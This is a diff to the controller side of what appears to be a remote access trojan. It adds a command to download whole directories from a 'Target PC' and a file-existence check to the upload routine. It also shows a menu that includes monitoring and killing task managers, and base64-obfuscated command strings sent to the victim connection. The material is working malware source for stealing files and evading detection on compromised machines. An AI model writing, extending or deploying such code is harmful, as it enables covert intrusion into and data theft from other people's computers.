@@ -73,6 +73,8 @@ def help_option():
 
                 Aviable Commands:
 
+                    | [!>] downloadDir <path> -> Download A full dir
+                    ---------------------------------------------------------
                     | [!>] download <path> -> Download A File From Target PC
                     ---------------------------------------------------------
                     | [!>] startTask       -> Monitoring & kill tasks managers
@@ -369,18 +371,21 @@ def upload(command, targetConn):
     codedUpload = f"dXBsb2FkCg== {command.replace('upload ', '')}"
     targetConn.send(codedUpload.encode())
     file = command.replace("upload ", "")
+    if os.path.exists(file):
 
-    with open(file, "rb") as fl:
-        while True:
-            dt = fl.read(4096)
-            dt = base64.b64encode(dt)
-            if not dt:
-                targetConn.send('end'.encode())
-                break
-            targetConn.send(dt)
-        fl.close()
+        with open(file, "rb") as fl:
+            while True:
+                dt = fl.read(4096)
+                dt = base64.b64encode(dt)
+                if not dt:
+                    targetConn.send('end'.encode())
+                    break
+                targetConn.send(dt)
+            fl.close()
 
-    print(f"\n\t{Y}[*>]{R} File Uploaded Successfully\n")
+        print(f"\n\t{Y}[*>]{R} File Uploaded Successfully\n")
+    else:
+        print(f"\n\t{R}[*>]{B} Local File Doesn't found...\n")
 
 
 def getFileURL(command, targetConn):
